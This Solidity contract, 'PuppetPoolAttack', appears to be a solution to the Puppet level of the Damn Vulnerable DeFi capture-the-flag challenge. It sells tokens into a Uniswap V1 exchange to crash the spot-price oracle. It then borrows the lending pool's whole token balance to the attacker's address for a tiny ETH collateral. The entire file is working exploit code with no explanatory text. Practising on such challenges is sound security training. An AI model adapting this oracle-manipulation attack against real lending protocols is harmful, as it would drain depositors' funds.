// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {PuppetPool} from "../puppet/PuppetPool.sol";
import "../DamnValuableToken.sol";

import "hardhat/console.sol";

interface IUniswapExchangeV1 {
    function tokenToEthSwapInput(uint256 tokens_sold, uint256 min_eth, uint256 deadline) external returns (uint256);
}

contract PuppetPoolAttack {
    uint256 public constant DEPOSIT_FACTOR = 2;

    PuppetPool private immutable victimePool;
    IUniswapExchangeV1 private uniswapExchange;
    DamnValuableToken private immutable token;
    address private immutable owner;

    constructor(address _victimePool, address _owner) {
        owner = _owner;
        victimePool = PuppetPool(_victimePool);
        uniswapExchange = IUniswapExchangeV1(victimePool.uniswapPair());
        token = victimePool.token();
    }

    function launchAttack(uint256 tokens_sold, uint256 min_eth) external payable {
        token.approve(address(uniswapExchange), tokens_sold);
        uniswapExchange.tokenToEthSwapInput(tokens_sold, min_eth, block.timestamp * 2);

        uint256 victimePoolTokenBalance = token.balanceOf(address(victimePool));
        uint256 ethToDeposit = calculateDepositRequired(victimePoolTokenBalance);
        victimePool.borrow{value: ethToDeposit}(victimePoolTokenBalance, owner);
    }

    function calculateDepositRequired(uint256 amount) public view returns (uint256) {
        return amount * _computeOraclePrice() * DEPOSIT_FACTOR / 10 ** 18;
    }

    function _computeOraclePrice() private view returns (uint256) {
        // calculates the price of the token in wei according to Uniswap pair
        return address(uniswapExchange).balance * (10 ** 18) / token.balanceOf(address(uniswapExchange));
    }

    receive() external payable {}
}
